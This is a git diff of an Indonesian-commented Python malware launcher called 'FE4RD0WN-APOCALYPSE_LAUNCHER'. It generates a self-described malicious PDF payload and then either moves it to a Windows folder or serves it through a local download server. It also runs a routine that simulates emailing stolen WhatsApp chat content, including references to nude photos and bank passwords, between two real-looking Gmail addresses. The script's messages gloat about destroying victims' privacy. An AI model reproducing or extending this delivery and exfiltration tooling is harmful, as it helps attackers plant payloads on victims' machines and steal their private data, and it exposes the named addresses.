@@ -9,6 +9,7 @@ import zlib
 import base64
 import smtplib
 import datetime
+import shutil # Import untuk memindahkan file
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from fpdf import FPDF
@@ -270,7 +271,7 @@ class FE4RD0WN_DownloadMaestro:
 
 
 if __name__ == "__main__":
-    print("😈 FE4RD0WN-APOCALYPSE_LAUNCHER v1.0 Initiated. One command, total chaos. 😈")
+    print("😈 FE4RD0WN-APOCALYPSE_LAUNCHER v3.0 Initiated. One command, TOTAL CHAOS. 😈")
     
     # --- Konfigurasi PDF ---
     pdf_factory = FE4RD0WN_ApocalypsePDF_Factory()
@@ -290,35 +291,65 @@ if __name__ == "__main__":
         payload_intensity=intensity
     )
     
-    print(f"\nDASAR BAJINGAN! File {apocalypse_pdf_path} ini adalah senjata pemusnah privasi-mu!")
+    print(f"\nDASAR BAJINGAN! File '{apocalypse_pdf_path}' ini adalah senjata pemusnah privasi-mu!")
     
-    # Pindahkan PDF yang baru dibuat ke direktori root script ini agar server dapat menyajikannya
+    # Pindahkan PDF yang baru dibuat ke direktori root script ini agar siap untuk disajikan/dipindahkan
+    target_local_path = os.path.join(os.getcwd(), output_name)
     if os.path.exists(apocalypse_pdf_path):
-        os.rename(apocalypse_pdf_path, os.path.join(os.getcwd(), output_name))
-        print(f"✅ PDF '{output_name}' dipindahkan ke direktori kerja untuk disajikan oleh server.")
+        shutil.move(apocalypse_pdf_path, target_local_path)
+        print(f"✅ PDF '{output_name}' dipindahkan dari '{pdf_factory.output_dir}' ke '{os.getcwd()}' untuk penanganan selanjutnya.")
     else:
-        print(f"💥 Gagal menemukan PDF yang dibuat di {apocalypse_pdf_path}. Server mungkin tidak punya payload!")
+        print(f"💥 Gagal menemukan PDF yang dibuat di {apocalypse_pdf_path}. Tidak ada payload untuk ditangani!")
         exit(1) # Keluar jika PDF tidak bisa ditemukan
 
-    # --- Simulasi Email (dari malware, bukan PDF) ---
-    print("\n--- DEMONSTRASI SIMULASI PENGIRIMAN EMAIL (OLEH MALWARE, BUKAN PDF) ---")
-    pdf_factory._simulate_send_whatsapp_data_email(
-        victim_identifier="TARGET_SANG_PECUNDANG",
-        chat_content="Ini adalah contoh isi chat yang sangat pribadi dan kotor yang telah dicuri: 'Rahasia saya adalah saya menipu atasan saya setiap hari...', 'Aku benci hidup ini...', 'Kapan kita akan menghancurkan dunia?', 'Foto bugilmu ada di sini...', 'Aku punya zero-day baru!', 'PASSWORD_BANK_INI_RAHASIA: *****'",
-        target_email="danarfirdhan@gmail.com",
-        sender_email="growapst@gmail.com"
-    )
-    print("\n----------------------------------------------------------------------")
+    # --- Pilihan Aksi Otomatis ---
+    print("\n--- Pilih Aksi Otomatis (Default: Download) ---")
+    action_choice = input("Tekan 'm' untuk MEMINDAHKAN ke folder Windows, atau tekan ENTER untuk OTOMATIS DOWNLOAD di Chrome: ").lower().strip()
 
-    # --- Jalankan Server Download ---
-    download_maestro = FE4RD0WN_DownloadMaestro(payload_filename=output_name, port=DEFAULT_DOWNLOAD_PORT)
-    download_maestro.run()
-
-    # Bersihkan file PDF yang dibuat saat keluar (jika bukan dummy payload dari server)
-    # Ini akan menghapus payload utama setelah server dimatikan.
-    if os.path.exists(output_name) and output_name != DEFAULT_PAYLOAD_FILENAME: # Jangan hapus jika user_inputnya default, takut ada masalah
+    if action_choice == 'm':
+        windows_path_input = input("Masukkan path Windows tujuan (misal: D:\\hasilpdf): ").strip()
+        # Konversi path Windows ke format Linux/WSL. Ini bekerja untuk WSL.
+        linux_target_path = windows_path_input.replace("\\", "/").replace(":", "").replace("D", "/mnt/d").replace("C", "/mnt/c") # Tambahkan C: juga
+        
         try:
-            os.remove(output_name)
-            print(f"🧹 Removed malicious PDF file: {output_name}")
+            # Pastikan direktori tujuan ada
+            os.makedirs(linux_target_path, exist_ok=True)
+            shutil.move(target_local_path, os.path.join(linux_target_path, output_name))
+            print(f"✅ PDF '{output_name}' berhasil dipindahkan dari '{os.getcwd()}' ke '{windows_path_input}' ({os.path.join(linux_target_path, output_name)}).")
+            # Setelah dipindahkan, tidak ada server yang perlu dijalankan.
+        except FileNotFoundError:
+            print(f"💥 Gagal memindahkan: Direktori tujuan '{windows_path_input}' tidak ditemukan atau '{linux_target_path}' tidak valid. Cek path-nya, dasar bego!")
+            print("💀 Karena gagal memindahkan, operasi dihentikan. Kau payah!")
+            # Hapus file PDF yang dibuat jika tidak bisa dipindahkan
+            if os.path.exists(target_local_path):
+                os.remove(target_local_path)
+            exit(1)
+        except Exception as e:
+            print(f"💥 Gagal memindahkan file: {e}. Kau payah! Mungkin hak akses bermasalah. Operasi dihentikan.")
+            # Hapus file PDF yang dibuat jika tidak bisa dipindahkan
+            if os.path.exists(target_local_path):
+                os.remove(target_local_path)
+            exit(1)
+    else: # Default action: automatic download
+        # --- Simulasi Email (dari malware, bukan PDF) ---
+        pdf_factory._simulate_send_whatsapp_data_email(
+            victim_identifier="TARGET_SANG_PECUNDANG",
+            chat_content="Ini adalah contoh isi chat yang sangat pribadi dan kotor yang telah dicuri: 'Rahasia saya adalah saya menipu atasan saya setiap hari...', 'Aku benci hidup ini...', 'Kapan kita akan menghancurkan dunia?', 'Foto bugilmu ada di sini...', 'Aku punya zero-day baru!', 'PASSWORD_BANK_INI_RAHASIA: *****'",
+            target_email="danarfirdhan@gmail.com",
+            sender_email="growapst@gmail.com"
+        )
+        print("\n----------------------------------------------------------------------")
+        
+        # --- Jalankan Server Download ---
+        download_maestro = FE4RD0WN_DownloadMaestro(payload_filename=output_name, port=DEFAULT_DOWNLOAD_PORT)
+        download_maestro.run()
+
+    print("\nHahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈")
+
+    # Bersihkan file PDF yang dibuat saat keluar (jika tidak dipindahkan)
+    if os.path.exists(target_local_path) and action_choice != 'm':
+        try:
+            os.remove(target_local_path)
+            print(f"🧹 Removed temporary malicious PDF file: {target_local_path}")
         except Exception as e:
             print(f"💥 Gagal menghapus file PDF: {e}. Mungkin masih terkunci, dasar tolol!")
